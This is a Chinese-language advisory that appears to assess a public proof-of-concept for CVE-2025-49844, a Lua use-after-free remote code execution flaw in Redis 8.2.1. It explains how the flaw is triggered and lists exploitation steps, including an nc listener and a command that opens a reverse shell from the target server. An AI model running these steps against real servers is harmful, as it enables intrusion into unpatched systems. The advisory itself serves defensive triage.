## CVE-2025-49844 - Redis 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** Redis 8.2.1-alpine, Redis 8.2.1-bookworm (可能影响更多版本)

**利用条件:** 需要认证，需要网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 5%

## 详情

CVE-2025-49844是一个存在于Redis中的Lua use-after-free漏洞，可能导致远程代码执行 (RCE)。该漏洞允许经过身份验证的攻击者通过精心构造的Lua脚本，在Redis服务器上执行任意代码，危害等级被评为关键（CVSS 10.0）。

**POC有效性分析：**
该POC是针对CVE-2025-49844的个人实现，旨在演示如何在Redis 8.2.1-alpine和Redis 8.2.1-bookworm Docker镜像上实现RCE。POC提供了详细的`README.md`文件，包含清晰的安装和使用说明，并明确了支持的目标构建版本。其核心利用机制基于Lua脚本的`use-after-free`漏洞，具体体现在`demonstration.py`中。该脚本通过一个自定义的`myloader`函数，在特定的垃圾回收时机（`collectgarbage("collect")`）触发`luaX_setinput`函数中的`chunkname`字符串的`use-after-free`。通过控制该内存区域，攻击者可以劫持程序流程，从而实现任意代码执行。POC的`pyproject.toml`文件列出了`redis`、`hexdump`和`iced-x86`等必要的依赖，这些都是安全研究中常用的合法库。整个项目结构清晰，代码逻辑易于理解，且提供了实际执行命令和反弹shell的功能，证明了其完整的利用能力。虽然作者谦虚地表示可能不如Wiz Research的实现，但已成功验证其工作能力，因此该POC被认为是高度有效和完整的。

**利用步骤：**
1.  **环境准备**：攻击者需要一台安装了Python和`uv`工具的机器。目标Redis服务器需运行受影响的版本（例如Redis 8.2.1）且配置了认证。攻击者需要有效的Redis认证凭据。
2.  **获取POC代码**：从GitHub仓库（例如：`https://github.com/dwisiswant0/CVE-2025-49844`）下载或克隆POC代码。
3.  **安装依赖**：根据`README.md`指示，可能需要安装POC所需的Python依赖，例如使用`uv run`或`pip install -r requirements.txt` (如果存在)。
4.  **执行单向命令**：若要执行一次性shell命令，例如在目标服务器`/data/`目录下创建`hello.txt`文件，攻击者可以使用命令：
    `uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"`
5.  **建立反向Shell**：若要获取反向shell，攻击者首先需要在本地监听一个端口，例如使用`netcat`：`nc -lvnp 4444`。然后，在运行POC的机器上执行以下命令，将`127.0.0.1`替换为攻击者的监听IP地址：
    `uv run cve-2025-49844 rshell -l 127.0.0.1 -p 4444`
    成功利用后，攻击者将在本地`netcat`会话中接收到来自Redis服务器的反向shell连接，从而获得对目标系统的完全控制。
6.  **漏洞触发细节**：POC中的`demonstration.py`利用了Lua解释器在加载脚本时对`chunkname`的处理。通过控制`myloader`函数在特定时机返回`nil`，并在随后触发垃圾回收（`collectgarbage("collect")`），使得`chunkname`对应的内存区域被释放但指针未清空。接着，通过分配新的小字符串（`get_smallstrs`），重新占用这块内存，从而实现`use-after-free`利用。`r.script_flush('SYNC')`操作有助于在`jemalloc tcache`中稳定内存布局，提高漏洞利用的可靠性。

**投毒风险分析：**
该POC的投毒风险被评估为较低，约为5%。

1.  **代码透明性高**：POC代码完全公开，结构清晰，可读性强。`demonstration.py`中漏洞利用的核心逻辑一目了然，没有使用混淆技术或难以理解的编码方式。
2.  **依赖库安全**：`pyproject.toml`文件中列出的依赖项（`redis`、`hexdump`、`iced-x86`）都是安全研究和开发领域广泛使用的知名、合法库。这些库本身不包含恶意功能，且POC并未引入任何非标准或可疑的外部脚本或二进制文件。
3.  **目的明确**：`README.md`明确指出这是一个个人实现的漏洞概念验证（"My personal proof-of-concept"），其主要目的是为了演示和验证Redis中的RCE漏洞。提供的功能仅限于漏洞利用所需的命令执行和反向shell，没有发现任何超出此范围的恶意附加功能。
4.  **无额外恶意行为**：对POC代码进行分析，未发现其包含任何下载并执行额外恶意负载、数据窃取、DDoS攻击、植入持久性后门或进行加密货币挖矿等行为。所有代码的执行都是为了实现漏洞利用并演示RCE能力，这是漏洞验证的预期行为，而非“投毒”。
5.  **不包含后门代码**：POC中执行的“后门”代码（如反向shell或任意系统命令）是漏洞成功利用的结果，而不是POC本身内置的隐藏恶意功能。POC只是提供了一个框架，允许用户自行指定要执行的命令。因此，这些不应被误判为投毒代码。

尽管该POC本身设计用于安全研究，且投毒风险低，但任何能够实现远程代码执行的工具都具备巨大的潜在危害。恶意行为者可以轻易地获取并滥用此POC来攻击未打补丁的Redis服务器，因此，组织仍需保持高度警惕，及时修补漏洞。

**项目地址:** https://github.com/dwisiswant0/CVE-2025-49844

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
